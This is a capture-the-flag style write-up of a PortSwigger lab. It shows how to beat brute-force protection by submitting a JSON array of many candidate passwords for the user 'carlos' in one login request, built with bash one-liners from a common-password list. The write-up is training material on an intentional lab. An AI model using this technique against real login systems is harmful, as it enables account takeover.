# Lab: Broken brute-force protection, multiple credentials per request
[Lab URL](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)


 This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

+ Victim's username: carlos
+ [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)


# Walking the webapp

Capturing the login POST request I see that my credentials that I sent for testing are being sent as JSON:

![image](https://user-images.githubusercontent.com/83407557/208735715-2c8d0ab6-2634-498b-9740-378ce966ddbf.png)


# Creating a list of multipe requests using bash

First step is to grab the passwords list provided by the lab:

```bash
└─$ head passwords              
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
```

Next I want to build out JSON with these and the username carlos:

```bash
└─$ for i in $(cat passwords);do echo '"username":"carlos",';echo '"password":''"'$i'",';done > creds.json
```
output:
```bash
└─$ head creds.json               
"username":"carlos",
"password":"123456",
"username":"carlos",
"password":"password",
"username":"carlos",
"password":"12345678",
"username":"carlos",
"password":"qwerty",
"username":"carlos",
"password":"123456789",
```

# pasting this into the POST request:

First I need to copy the json I made:

```bash
└─$ cat creds.json|xclip -selection clipboard
```

and then use repeater to add it to my POST request:

![image](https://user-images.githubusercontent.com/83407557/208737593-cb6a6c3b-635f-4450-8669-b85dd2887207.png)

This method did not work.

# Trying to send the passwords as an array

Similar to the last attempt, next I will try just a single username parameter, but send the passwords as an array in json

### Making passwords.json:

```bash
for i in $(cat passwords);do echo '"'$i'",';done > passwords.json
```
```bash
└─$ head passwords.json 
"123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
"dragon",
```
After getting several errors, I realized I also needed to remove all the newlines from the above, to do that I used tr:
```bash
tr -d '\n' < passwords.json > pass_no_newline.json
```
output:
```bash
└─$ head pass_no_newline.json 
"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow",
```


### using repeater to pass an array:

![image](https://user-images.githubusercontent.com/83407557/208742965-872c2c03-54b8-443c-9558-54e046477dea.png)

Then I can click show response in browser:

![image](https://user-images.githubusercontent.com/83407557/208743086-a269071f-7625-497f-81fd-3e672c9f339f.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/208743188-e5d794ff-bfe4-4695-a423-6483700dce64.png)


Note( after completing the lab I went back and found that I didn't need to put everything on one line, it was actually the "":"" at the end that was causing the error:

![image](https://user-images.githubusercontent.com/83407557/208744208-f12f5556-2a34-4030-9803-c3663872f380.png)

![image](https://user-images.githubusercontent.com/83407557/208744318-a26701b3-3151-4d17-8b09-efa3cfb4dd7a.png)

hope that helps someone ; p
